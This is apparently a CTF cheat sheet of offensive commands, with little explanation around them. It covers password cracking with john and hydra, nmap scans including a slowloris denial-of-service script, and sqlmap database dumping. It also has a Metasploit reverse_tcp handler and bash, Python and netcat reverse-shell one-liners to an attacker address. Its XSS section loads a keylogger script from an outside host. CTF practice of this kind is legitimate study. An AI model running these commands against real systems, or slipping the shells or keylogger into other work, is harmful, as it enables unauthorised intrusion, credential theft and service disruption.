# 🛡️ CTF Writeups

A collection of useful commands and notes for Capture The Flag (CTF) competitions.

---

## 📋 Table of Contents

1. [Basic Commands](#basic-commands)
2. [Advanced Commands](#advanced-commands)
3. [Nmap Usage](#nmap-usage)
4. [Random Points from TryHackMe (THM)](#random-points-from-tryhackme-thm)
5. [Additional Resources](#additional-resources)
6. [Conclusion](#conclusion)

---

## Basic Commands

- **zip2john**: Convert a ZIP file to a format that John the Ripper can crack.
    ```sh
    zip2john file.zip > file.zip.hash
    john file.zip.hash
    ```

- **gobuster**: Directory/file brute-forcing tool.
    ```sh
    gobuster dir -u TARGET -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
    ```

- **find**: Search for files.
    ```sh
    find / -type f -regex '.*skat.txt$' 2> /dev/null
    find / -name findme.txt 2> test.txt
    ```

- **nmap**: Network scanner.
    ```sh
    nmap -T4 -A -p- TARGET -oN nmap.txt
    ```

- **hydra**: Password cracking tool.
    ```sh
    hydra -l mark -P /usr/share/wordlists/rockyou.txt IP_Address ssh
    hydra -l admin -x 4:4:MLVICDX -vV sshhydra.com ssh
    hydra -l admin -P /usr/share/john/password.lst -vV ftplogin.com ftp
    ```

---

## Advanced Commands

- **Nmap Scripts**: Use NSE scripts to identify vulnerabilities.
    ```sh
    nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p PORT -T4 IP_Address
    nmap --script http-slowloris --max-parallelism 400 IP_Address
    ```

- **SQLMap**: Automatic SQL injection and database takeover tool.
    ```sh
    sqlmap -u "http://target.com/vulnerable_param" --batch --dbs
    sqlmap -u "http://target.com/vulnerable_param" -D database_name --tables
    sqlmap -u "http://target.com/vulnerable_param" -D database_name -T table_name --columns
    sqlmap -u "http://target.com/vulnerable_param" -D database_name -T table_name -C column_name --dump
    ```

- **Metasploit**: Penetration testing framework.
    ```sh
    msfconsole
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST your_ip
    set LPORT your_port
    exploit
    ```

- **Burp Suite**: Web vulnerability scanner.
    - **Intruder**: Use Intruder to brute force login forms or find hidden parameters.
    - **Repeater**: Manually send and analyze HTTP requests.

- **Exploiting SMB**:
    ```sh
    smbclient -L //TARGET_IP -U username
    smbmap -H TARGET_IP
    ```

- **Reverse Shells**:
    - **Bash**:
        ```sh
        bash -i >& /dev/tcp/your_ip/your_port 0>&1
        ```
    - **Python**:
        ```python
        python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your_ip",your_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
        ```
    - **Netcat**:
        ```sh
        nc -e /bin/sh your_ip your_port
        ```

---

## Nmap Usage

- **OS Detection**:
    ```sh
    nmap -O TARGET
    ```
- **Service Version Detection**:
    ```sh
    nmap -sV TARGET
    ```
- **Stealth Scan**:
    ```sh
    nmap -sS TARGET
    ```
- **Aggressive Scan**:
    ```sh
    nmap -A TARGET
    ```

---

## Random Points from TryHackMe (THM)

- **Popups**:
    ```html
    <script>alert("Hello World")</script>
    ```
    Creates a Hello World message popup on a user's browser.

- **Writing HTML**:
    ```javascript
    document.write("Your HTML code here");
    ```
    Override the website's HTML to add your own content.

- **XSS Keylogger**: Capture keystrokes of a user.
    ```html
    <script src="http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js"></script>
    ```

- **Port Scanning**:
    ```html
    <script src="http://www.xss-payloads.com/payloads/scripts/portscanapjs.js"></script>
    ```

---

## Additional Resources

- [GTFOBins](https://gtfobins.github.io/): Unix binaries that can be used to bypass local security restrictions.
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): A list of useful payloads and bypasses for Web Application Security.
- [HackTricks](https://book.hacktricks.xyz/): A comprehensive guide for penetration testing and CTF challenges.

---
